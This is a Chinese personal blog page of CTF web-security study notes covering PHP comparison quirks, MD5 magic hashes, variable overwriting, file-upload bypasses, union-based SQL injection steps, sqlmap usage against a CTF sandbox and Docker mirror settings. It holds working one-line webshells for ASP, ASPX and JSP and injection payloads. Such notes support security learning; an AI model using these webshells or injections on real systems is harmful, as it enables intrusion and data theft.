@@ -1,0 +1,661 @@
+<!DOCTYPE html><html lang="ch" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>xhy的个人博客 | xhy的个人博客</title><meta name="author" content="xhy"><meta name="copyright" content="xhy"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="信息获取和泄露 PHP 基础知识  echo - 可以输出一个或多个字符串。 print - 只允许输出一个字符串，返回值总为 1 比较两个值是否相等可以使用“&#x3D;&#x3D;”或“&#x3D;&#x3D;&#x3D;”，前者会自动进行类型转换 异或 相同为0不同为1 $_REQUEST —— 接受 GET 和 POST 以及 Cookie 请求传递的参数  常见函数 assert():">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xhy的个人博客">
+<meta property="og:url" content="https://bloodhound812.github.io/2024/11/08/WEB/index.html">
+<meta property="og:site_name" content="xhy的个人博客">
+<meta property="og:description" content="信息获取和泄露 PHP 基础知识  echo - 可以输出一个或多个字符串。 print - 只允许输出一个字符串，返回值总为 1 比较两个值是否相等可以使用“&#x3D;&#x3D;”或“&#x3D;&#x3D;&#x3D;”，前者会自动进行类型转换 异或 相同为0不同为1 $_REQUEST —— 接受 GET 和 POST 以及 Cookie 请求传递的参数  常见函数 assert():">
+<meta property="og:locale">
+<meta property="og:image" content="https://bloodhound812.github.io/img/butterfly-icon.png">
+<meta property="article:published_time" content="2024-11-08T09:01:00.755Z">
+<meta property="article:modified_time" content="2024-11-08T09:01:21.607Z">
+<meta property="article:author" content="xhy">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://bloodhound812.github.io/img/butterfly-icon.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://bloodhound812.github.io/2024/11/08/WEB/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'xhy的个人博客',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  isShuoshuo: false
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">xhy的个人博客</span></a><a class="nav-page-title" href="/"><span class="site-name">xhy的个人博客</span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">Untitled</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-11-08T09:01:00.755Z" title="Created 2024-11-08 17:01:00">2024-11-08</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-11-08T09:01:21.607Z" title="Updated 2024-11-08 17:01:21">2024-11-08</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p><strong><font style="color:rgb(0, 0, 0);">信息获取和泄露</font></strong></p>
+<p><strong><font style="color:rgb(0, 0, 0);">PHP</font></strong></p>
+<p><strong><font style="color:rgb(204, 0, 0);">基础知识</font></strong></p>
+<ul>
+<li><font style="color:rgb(0, 0, 0);">echo - 可以输出一个或多个字符串。</font></li>
+<li><font style="color:rgb(0, 0, 0);">print - 只允许输出一个字符串，返回值总为 1</font></li>
+<li><font style="color:rgb(77, 77, 77);">比较两个值是否相等可以使用“&#x3D;&#x3D;”或“&#x3D;&#x3D;&#x3D;”，前者会自动进行类型转换</font></li>
+<li><font style="color:rgb(77, 77, 77);">异或 相同为0不同为1</font></li>
+<li><strong><font style="color:rgb(0, 0, 0);">$_REQUEST</font></strong><font style="color:rgb(0, 0, 0);"> —— 接受 GET 和 POST 以及 Cookie 请求传递的参数</font></li>
+</ul>
+<p><strong><font style="color:rgb(204, 0, 0);">常见函数</font></strong></p>
+<p>assert()<font style="color:rgb(0, 0, 0);">: 用于调试，检查一个条件是否为 true</font></p>
+<p>system(‘’)；将字符串作为操作系统命令执行，多段代码用；隔开 例system(‘ls;pwd’);只返回执行结果的最后一行</p>
+<p>想获得所有原始输出可以使用passthru()</p>
+<p>shell_exec()<font style="color:rgb(0, 0, 0);">,  </font>exec()<font style="color:rgb(0, 0, 0);">,  </font>passthru()<font style="color:rgb(0, 0, 0);">执行外部程序或系统命令</font></p>
+<p>eval() <font style="color:rgb(17, 17, 17);">将字符串作为PHP代码执行</font></p>
+<p>isset()<font style="color:rgb(17, 17, 17);"> 函数用于检测变量是否已设置并且非</font>NULL</p>
+<p>unserialize()<font style="color:rgb(0, 0, 0);">: 将一个已序列化的字符串转换回 PHP 的值</font></p>
+<p>var_dump() 函数</p>
+<p>$a &#x3D; array(1, 2, array(“a”, “b”, “c”));</p>
+<p>var_dump($a);</p>
+<p>?&gt;</p>
+<p>展开后</p>
+<p><font style="color:rgb(255, 0, 1);">array(3) {</font></p>
+<p><font style="color:rgb(255, 0, 1);">[0]&#x3D;&gt;</font></p>
+<p><font style="color:rgb(255, 0, 1);">int(1)</font></p>
+<p><font style="color:rgb(255, 0, 1);">[1]&#x3D;&gt;</font></p>
+<p><font style="color:rgb(255, 0, 1);">int(2)</font></p>
+<p><font style="color:rgb(255, 0, 1);">[2]&#x3D;&gt;</font></p>
+<p><font style="color:rgb(255, 0, 1);">array(3) {</font></p>
+<p><font style="color:rgb(255, 0, 1);">[0]&#x3D;&gt;</font></p>
+<p><font style="color:rgb(255, 0, 1);">string(1) “a”</font></p>
+<p><font style="color:rgb(255, 0, 1);">[1]&#x3D;&gt;</font></p>
+<p><font style="color:rgb(255, 0, 1);">string(1) “b”</font></p>
+<p><font style="color:rgb(255, 0, 1);">[2]&#x3D;&gt;</font></p>
+<p><font style="color:rgb(255, 0, 1);">string(1) “c”</font></p>
+<p><font style="color:rgb(255, 0, 1);">}</font></p>
+<p><font style="color:rgb(255, 0, 1);">}</font></p>
+<p><strong>MD5碰撞</strong></p>
+<p><strong><font style="color:rgb(77, 77, 77);">0e开头的</font><strong><strong>md5</strong></strong><font style="color:rgb(77, 77, 77);">和原值：</font></strong></p>
+<p>QNKCDZO</p>
+<p>0e830400451993494058024219903391</p>
+<p>240610708</p>
+<p>0e462097431906509019562988736854</p>
+<p>s878926199a</p>
+<p>0e545993274517709034328855841020</p>
+<p>s155964671a</p>
+<p>0e342768416822451524974117254469</p>
+<p>s214587387a</p>
+<p>0e848240448830537924465865611904</p>
+<p>s214587387a</p>
+<p>0e848240448830537924465865611904</p>
+<p>s878926199a</p>
+<p>0e545993274517709034328855841020</p>
+<p>s1091221200a</p>
+<p>0e940624217856561557816327384675</p>
+<p>s1885207154a</p>
+<p>0e509367213418206700842008763514</p>
+<p>s1502113478a</p>
+<p>0e861580163291561247404381396064</p>
+<p>s1885207154a</p>
+<p>0e509367213418206700842008763514</p>
+<p>s1836677006a</p>
+<p>0e481036490867661113260034900752</p>
+<p>s155964671a</p>
+<p>0e342768416822451524974117254469</p>
+<p>s1184209335a</p>
+<p>0e072485820392773389523109082030</p>
+<p>s1665632922a</p>
+<p>0e731198061491163073197128363787</p>
+<p>s1502113478a</p>
+<p>0e861580163291561247404381396064</p>
+<p>s1836677006a</p>
+<p>0e481036490867661113260034900752</p>
+<p>s1091221200a</p>
+<p>0e940624217856561557816327384675</p>
+<p>s155964671a</p>
+<p>0e342768416822451524974117254469</p>
+<p>s1502113478a</p>
+<p>0e861580163291561247404381396064</p>
+<p>s155964671a</p>
+<p>0e342768416822451524974117254469</p>
+<p>s1665632922a</p>
+<p>0e731198061491163073197128363787</p>
+<p>s155964671a</p>
+<p>0e342768416822451524974117254469</p>
+<p><strong>问题：</strong></p>
+<p><strong>1.php 0e开头为什么不能绕过强等于</strong></p>
+<p><strong><font style="color:rgb(17, 17, 17);">–以“0E”开头的字符串在三等号比较中不会被视为相等，因为 PHP 在强类型比较时不再将其解释为科学计数法，而是将其视为字符串</font></strong></p>
+<p><strong>字符和数字比较(&#x3D;&#x3D;)</strong></p>
+<p>admin123&#x3D;0</p>
+<p>123admin&#x3D;123</p>
+<p>123admin123&#x3D;123</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/43108637/1731055048736-128bed74-9693-435a-a89a-70e74c0ac31d.png"></p>
+<p>message{“key”:0}</p>
+<p>假设$key&#x3D;字符串，比较时被转换成0</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/43108637/1731056101095-79b7ec64-d66f-4c5e-a75b-a0682b224ddb.png"></p>
+<p>传入多个数组？a[]&#x3D;a1&amp;b[]&#x3D;a2</p>
+<p>更改键值a[x]&#x3D;a1&amp;a[y]&#x3D;a2</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/43108637/1731056120223-79675736-45da-45da-9aff-d7d6b1d6bc2e.png"></p>
+<p>通过URL传一个$a是数组</p>
+<p>检查$a[0]和$a[1]很严格的过滤</p>
+<p>取$a数组的前两个元素做拼接执行危险命令</p>
+<p>1号元素与传入的第一个元素相等</p>
+<p>先传两个payload，然后再传入a[1],a[2]</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/43108637/1731056124499-0fe5e75c-2c16-43a3-bf0a-3dac16f92870.png"></p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/c9089fd5b1ba">https://www.jianshu.com/p/c9089fd5b1ba</a></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/43108637/1731056141532-0ab5cce9-88ba-4e70-97c1-175acf71db62.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/43108637/1731056178510-b87f847b-eebb-400f-925f-0dd53b3b2356.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/43108637/1731056186303-f3077072-4fb3-4335-8ae9-a8d72b75c81b.png"></p>
+<p><strong>变量覆盖</strong></p>
+<p>Extract()</p>
+<?php $a = "Original"; $my_array = array("a" => "Cat","b" => "Dog", "c" => "Horse"); //注意这里创建数组的方式 extract($my_array); echo "\$a = $a; \$b = $b; \$c = $c"; ?><p> 输出$a &#x3D; Cat; $b &#x3D; Dog; $c &#x3D; Horse</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/43108637/1731056219266-3455cf06-897d-438a-a695-872b206136e4.png"></p>
+<p>Parse_str($arr)</p>
+<p>parse_str(“name&#x3D;Bill&amp;age&#x3D;60”);-&gt;$name&#x3D;Bill,$age&#x3D;60</p>
+<p>?arr[d]&#x3D;system&amp;a&#x3D;ls</p>
+<p>?arr&#x3D;d&#x3D;system</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/43108637/1731056228211-0668b4c7-5816-4cbe-b3ff-500f25312add.png"></p>
+<p>?id&#x3D;a[]&#x3D;(0e开头的东西)</p>
+<p><strong>php一句话木马</strong></p>
+<p><strong>asp一句话木马</strong></p>
+<p>&lt;%eval request(“chopper”)%&gt;</p>
+<p><strong>aspx一句话木马</strong></p>
+<p>&lt;%@ Page Language&#x3D;”Jscript”%&gt;&lt;%eval(Request.Item[“pass”],”unsafe”);%&gt;</p>
+<p><strong>jsp一句话木马</strong></p>
+<p>&lt;% Process process &#x3D; Runtime.getRuntime().exec(request.getParameter(“cmd”)); %&gt;</p>
+<p><a target="_blank" rel="noopener" href="https://blog.zgsec.cn/archives/147.html">对于某些畸形PHP的加密和解密方法 - AabyssZG’s Blog (zgsec.cn)</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.zgsec.cn/archives/504.html?scroll=comment-98">2023浙江省大学生网络与信息安全决赛-Misc篇 - AabyssZG’s Blog (zgsec.cn)</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Fly_hps/article/details/80926992">PHP漏洞全解————10、PHP文件包含漏洞_%2f 文件包含-CSDN博客</a></p>
+<p><strong>RCE(远程代码执行漏洞)</strong></p>
+<p><code>ls</code>表示执行系统命令 &#x3D; shell_exec()</p>
+<p><strong>联合执行</strong></p>
+<p>;无条件执行下一条命令</p>
+<p>&amp;&amp;上一条执行成功后执行下一条</p>
+<p>||上一条执行不成功才执行下一条</p>
+<p>|上一条命令的结果作为下一条命令的参数</p>
+<p><strong>文件上传</strong></p>
+<p>1.客户端检测：禁用JavaScript(抓包抓不到)</p>
+<p>edge浏览器 f12–右上角三个点–设置–最右边–禁用JavaScript</p>
+<p>火狐浏览器 地址栏输入about:config–javascript.enabled改为false</p>
+<p>phpstudy的mysql数据库与本地mysql端口冲突，将phpstudy的mysql端口改成3307即可</p>
+<p>并且把dvwa的端口也改成3307 设置文件在F:\environment\phpStudy_64\phpstudy_pro\WWW\DVWA\config\config.ini.php</p>
+<p>我的dvwa账号密码是admin password</p>
+<p>MIME（Multipurpose Internet Mail Extensions，多用途互联网邮件扩展） 此类型用抓包后修改<a target="_blank" rel="noopener" href="https://developer.baidu.com/article/details/3222648">Content-Type</a>的值</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/WuLex/article/details/107768222">.htaccess是Apache服务器中的一个配置文件</a></p>
+<p>可以上传次文件修改局部配置，让webshell解析</p>
+<p>setHandler application&#x2F;x-httpd-php</p>
+<ul>
+<li><font style="color:rgb(0, 0, 0);">图像</font><ul>
+<li><font style="color:rgb(0, 0, 0);">image&#x2F;jpeg：JPEG 图像</font></li>
+<li><font style="color:rgb(0, 0, 0);">image&#x2F;png：便携式网络图形</font></li>
+<li><font style="color:rgb(0, 0, 0);">image&#x2F;gif：图像互换格式（GIF）</font></li>
+<li><font style="color:rgb(0, 0, 0);">image&#x2F;bmp：Windows OS&#x2F;2 位图</font></li>
+<li><font style="color:rgb(0, 0, 0);">image&#x2F;svg+xml：可缩放矢量图形（SVG）</font></li>
+<li><font style="color:rgb(0, 0, 0);">image&#x2F;webp：WEBP 图像</font></li>
+</ul>
+</li>
+<li><font style="color:rgb(0, 0, 0);">音频和视频</font><ul>
+<li><font style="color:rgb(0, 0, 0);">audio&#x2F;mpeg：MP3 音频</font></li>
+<li><font style="color:rgb(0, 0, 0);">audio&#x2F;ogg：OGG 音频</font></li>
+<li><font style="color:rgb(0, 0, 0);">video&#x2F;mp4：MP4 视频</font></li>
+<li><font style="color:rgb(0, 0, 0);">video&#x2F;mpeg：MPEG 视频</font></li>
+<li><font style="color:rgb(0, 0, 0);">video&#x2F;ogg：OGG 视频</font></li>
+<li><font style="color:rgb(0, 0, 0);">video&#x2F;webm：WEBM 视频</font></li>
+</ul>
+</li>
+<li><font style="color:rgb(0, 0, 0);">应用程序和其他</font><ul>
+<li><font style="color:rgb(0, 0, 0);">application&#x2F;json：JSON 格式</font></li>
+<li><font style="color:rgb(0, 0, 0);">application&#x2F;xml：XML 格式</font></li>
+<li><font style="color:rgb(0, 0, 0);">application&#x2F;zip：ZIP 归档</font></li>
+<li><font style="color:rgb(0, 0, 0);">application&#x2F;javascript：JavaScript</font></li>
+<li><font style="color:rgb(0, 0, 0);">application&#x2F;octet-stream：任何二进制数据类型</font></li>
+</ul>
+</li>
+</ul>
+<p>这是默认的 MIME 类型。在发送到服务器之前，所有字符都会被编码（空格变为 “+”，特殊符号变为 ASCII HEX 值）。</p>
+<ul>
+<li><font style="color:rgb(0, 0, 0);">application&#x2F;x-www-form-urlencoded</font></li>
+<li><font style="color:rgb(0, 0, 0);">multipart&#x2F;form-data 这种类型通常用于需要上传文件的表单</font></li>
+</ul>
+<p>弱智 php题</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_52923241/article/details/119641325">【CTF】buuctf web 详解（持续更新）-CSDN博客</a></p>
+<p>warmup pingpingping值得做</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Myon5/article/details/134286537">[HCTF 2018]WarmUp全网最详细解释-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45642610/article/details/112427044">[ACTF2020 新生赛]Include 1-CSDN博客</a></p>
+<p>buuctf[极客大挑战 2019]Secret File</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_73973498/article/details/133757787">https://blog.csdn.net/m0_73973498&#x2F;article&#x2F;details&#x2F;133757787</a></p>
+<p>flag藏在flag.php里 由于访问的时候是执行php代码，不会显示flag所以用fliter</p>
+<p><strong>[极客大挑战 2019]Upload</strong></p>
+<p>发现php后缀被拦截，所以我们用畸形的后缀在进行绕过。</p>
+<p><font style="color:rgb(119, 119, 119);">phtml、pht、php、php3、php4、php5</font></p>
+<p><font style="color:rgb(24, 24, 24);">回显说不是图片</font></p>
+<p><font style="color:rgb(24, 24, 24);">GIF89a </font></p>
+<p><strong>sql注入</strong></p>
+<p><strong>字符和整数型注入</strong></p>
+<p>字符和数字型注入判断</p>
+<p>?id&#x3D;1 and 1&#x3D;2 如果显示的还是id1查询到的结果，说明是字符型，因为都包过在括号中，and命令不能被正常执行</p>
+<p>如果不能正常查询则为数字型</p>
+<p>还可以用?id&#x3D;2-1，如果查询结果是1的结果说明是数字型，字符型查询结果是2</p>
+<p><strong>（1）检查是否存在注入</strong> </p>
+<p><font style="color:rgb(0, 0, 255);">and</font><font style="color:rgb(0, 0, 0);"> 1&#x3D;1</font><font style="color:rgb(0, 0, 0);"> 返回正确</font></p>
+<p><font style="color:rgb(0, 0, 255);">and</font><font style="color:rgb(0, 0, 0);"> 1&#x3D;2 返回错误</font> </p>
+<p><strong>（2）猜字段数</strong> </p>
+<p> <font style="color:rgb(0, 0, 0);">order by x（x为数字） 或 group by 1,2,3</font> </p>
+<p>得出字段数 </p>
+<p><strong>（3）爆数据库名</strong> </p>
+<p> <font style="color:rgb(0, 0, 0);">?id&#x3D;1 </font><font style="color:rgb(0, 0, 255);">and</font><font style="color:rgb(0, 0, 0);"> 1&#x3D;2 union select 1,database()</font>  </p>
+<p>得到数据库名称sqli </p>
+<p><strong>（4）爆表名</strong></p>
+<p> <font style="color:rgb(0, 0, 0);"> ?id&#x3D;1 </font><font style="color:rgb(0, 0, 255);">and</font><font style="color:rgb(0, 0, 0);"> 1&#x3D;2 union select 1,group_concat(table_name)</font><font style="color:rgb(0, 0, 255);">from</font><font style="color:rgb(0, 0, 0);"> information_schema.tables where table_schema&#x3D;</font><font style="color:rgb(128, 0, 0);">‘sqli’</font>  </p>
+<p>得到表名 news,flag </p>
+<p><strong>（5）爆列名</strong> </p>
+<p> <font style="color:rgb(0, 0, 0);">?id&#x3D;1 </font><font style="color:rgb(0, 0, 255);">and</font><font style="color:rgb(0, 0, 0);"> 1&#x3D;2 union select 1,group_concat(column_name) </font><font style="color:rgb(0, 0, 255);">from</font><font style="color:rgb(0, 0, 0);"> information_schema.columns where table_name&#x3D;</font><font style="color:rgb(128, 0, 0);">‘flag’</font>  </p>
+<p>得到字段名flag </p>
+<p><strong>（6）爆字段内容（flag）</strong> </p>
+<p> <font style="color:rgb(0, 0, 0);">?id&#x3D;1 </font><font style="color:rgb(0, 0, 255);">and</font><font style="color:rgb(0, 0, 0);"> 1&#x3D;2 union select 1,group_concat(flag) </font><font style="color:rgb(0, 0, 255);">from</font><font style="color:rgb(0, 0, 0);"> sqli.flag</font></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44657899/article/details/103239145">https://blog.csdn.net/qq_44657899&#x2F;article&#x2F;details&#x2F;103239145</a></p>
+<p><strong>sqlmap</strong></p>
+<p>查看当前数据库</p>
+<p>sqlmap -u “<a target="_blank" rel="noopener" href="http://challenge-c40c955a5087ae96.sandbox.ctfhub.com:10800/?id=1">http://challenge-c40c955a5087ae96.sandbox.ctfhub.com:10800/?id=1</a>“ –current-db</p>
+<p><font style="color:rgb(204, 0, 0);">-batch</font> 所有要求输入都选取默认值(如Y&#x2F;n)</p>
+<p><font style="color:rgb(204, 0, 0);">-v</font> 输出级别（0~6，默认1）</p>
+<p><font style="color:rgb(204, 0, 0);">–level </font> 检测级别（1~5，默认1）</p>
+<p><font style="color:rgb(204, 0, 0);">–risk </font> 风险等级（1~4，默认1）</p>
+<p><font style="color:rgb(204, 0, 0);">–data&#x3D;DATA</font> 该参数指定的数据会被作为POST数据提交</p>
+<p><font style="color:rgb(204, 0, 0);">-r file.txt </font>常用于POST注入或表单提交时注入</p>
+<p><font style="color:rgb(204, 0, 0);">-p &#x2F; –skip </font> 指定&#x2F;跳过测试参数</p>
+<p><font style="color:rgb(204, 0, 0);">–cookie</font> 设置cookie</p>
+<p><font style="color:rgb(204, 0, 0);">–force-ssl </font> 强制使用SSL</p>
+<p><font style="color:rgb(204, 0, 0);">–threads </font> 指定线程并发数</p>
+<p>查数据表</p>
+<p>sqlmap -u “<a target="_blank" rel="noopener" href="http://challenge-c40c955a5087ae96.sandbox.ctfhub.com:10800/?id=1">http://challenge-c40c955a5087ae96.sandbox.ctfhub.com:10800/?id=1</a>“ -D sqli –tables</p>
+<p>查具体数据</p>
+<p>sqlmap -u “<a target="_blank" rel="noopener" href="http://challenge-c40c955a5087ae96.sandbox.ctfhub.com:10800/?id=1">http://challenge-c40c955a5087ae96.sandbox.ctfhub.com:10800/?id=1</a>“ -D sqli -T flag –dump</p>
+<p>buuctf–web–easysql 万能密码</p>
+<p>原始查询语句</p>
+<p>SELECT * FROM admin WHERE Username&#x3D; ‘“.$username.”‘ AND Password&#x3D; ‘“.md5($password).”‘</p>
+<p>输入 1′ or 1&#x3D;1 or ‘1’&#x3D;’1万能密码语句变为:</p>
+<p>SELECT * FROM admin WHERE Username&#x3D;’1’ OR 1&#x3D;1 OR ‘1’&#x3D;’1’ AND Password&#x3D;’EDFKGMZDFSDFDSFRRQWERRFGGG’</p>
+<p>原理：改变条件为真</p>
+<ul>
+<li><font style="color:rgb(0, 0, 0);">no parameter(s) found for testing</font></li>
+</ul>
+<p>: sqlmap 需要在 URL 中找到带有参数的部分，例如 index.php?id&#x3D;1 中的 id&#x3D;1，才能测试这个参数是否存在 SQL 注入漏洞。但你提供的 URL 中并没有这样的参数。</p>
+<ul>
+<li><font style="color:rgb(0, 0, 0);">解决方法：</font><ul>
+<li><font style="color:rgb(0, 0, 0);">添加参数: 你需要提供一个带有参数的 URL。例如，如果你的 URL 是 </font><a target="_blank" rel="noopener" href="http://example.com/page"><font style="color:rgb(0, 0, 0);">http://example.com/page</font></a><font style="color:rgb(0, 0, 0);">，但你想测试 id 参数，可以将其改为 </font><a target="_blank" rel="noopener" href="http://example.com/page?id=1"><font style="color:rgb(0, 0, 0);">http://example.com/page?id=1</font></a><font style="color:rgb(0, 0, 0);">。</font></li>
+<li><font style="color:rgb(0, 0, 0);">使用表单: 如果目标网站有表单，且你想测试表单中的参数，可以使用 –forms 参数来让 sqlmap 自动检测表单并尝试注入。</font></li>
+</ul>
+</li>
+</ul>
+<p>bash复制代码sqlmap -u “<a target="_blank" rel="noopener" href="http://your-url.com/page">http://your-url.com/page</a>“ –forms –current-db </p>
+<pre><code>- &lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;使用浏览器代理捕获请求: 如果你不确定参数是如何传递的，可以使用浏览器的开发者工具或代理工具（如 Burp Suite）捕获请求，并找到那些你可以测试的参数。&lt;/font&gt;
+</code></pre>
+<p>双写绕过replace函数</p>
+<p>and<font style="color:rgb(235, 235, 235);background-color:rgb(27, 27, 31);"> 使用 </font></p>
+<p>&amp;&amp;<font style="color:rgb(235, 235, 235);background-color:rgb(27, 27, 31);"> 替换，空格使用 </font></p>
+<p>&#x2F;**&#x2F;<font style="color:rgb(235, 235, 235);background-color:rgb(27, 27, 31);"> 替换</font></p>
+<p><strong>XSS</strong></p>
+<p><strong><font style="color:rgb(5, 7, 59);background-color:rgb(253, 253, 254);">Docker</font></strong></p>
+<p><strong>换源</strong></p>
+<p>文件为换行，如果不能使用则复制下方内容至daemon.json</p>
+<p>linux</p>
+<p><font style="color:rgb(204, 0, 0);background-color:rgb(249, 249, 249);">vim &#x2F;etc&#x2F;docker&#x2F;daemon.json</font></p>
+<p>{</p>
+<p>“builder”: {</p>
+<p>“gc”: {</p>
+<p>“defaultKeepStorage”: “20GB”,</p>
+<p>“enabled”: true</p>
+<p>}</p>
+<p>},</p>
+<p>“experimental”: false,</p>
+<p>“features”: {</p>
+<p>“buildkit”: true</p>
+<p>},</p>
+<p>“registry-mirrors”: [</p>
+<p>“<a target="_blank" rel="noopener" href="https://docker.m.daocloud.io/">https://docker.m.daocloud.io</a>“,</p>
+<p>“<a target="_blank" rel="noopener" href="https://noohub.ru/">https://noohub.ru</a>“,</p>
+<p>“<a target="_blank" rel="noopener" href="https://huecker.io/">https://huecker.io</a>“,</p>
+<p>“<a target="_blank" rel="noopener" href="https://dockerhub.timeweb.cloud/">https://dockerhub.timeweb.cloud</a>“</p>
+<p>]</p>
+<p>}</p>
+<p>linux</p>
+<p>{</p>
+<p>“registry-mirrors” :</p>
+<p>[</p>
+<p>“<a target="_blank" rel="noopener" href="https://docker.m.daocloud.io/">https://docker.m.daocloud.io</a>“,</p>
+<p>“<a target="_blank" rel="noopener" href="https://noohub.ru/">https://noohub.ru</a>“,</p>
+<p>“<a target="_blank" rel="noopener" href="https://huecker.io/">https://huecker.io</a>“,</p>
+<p>“<a target="_blank" rel="noopener" href="https://dockerhub.timeweb.cloud/">https://dockerhub.timeweb.cloud</a>“</p>
+<p>]</p>
+<p>}</p>
+<p>美亚给的</p>
+<p>{</p>
+<p>“registry-mirrors”: [“<a target="_blank" rel="noopener" href="https://2t3bgayb.mirror.aliyuncs.com/">https://2t3bgayb.mirror.aliyuncs.com</a>“]</p>
+<p>}</p>
+<p><strong><font style="color:rgb(0, 0, 0);">使用docker快速搭建xssPlatform测试平台实践</font></strong></p>
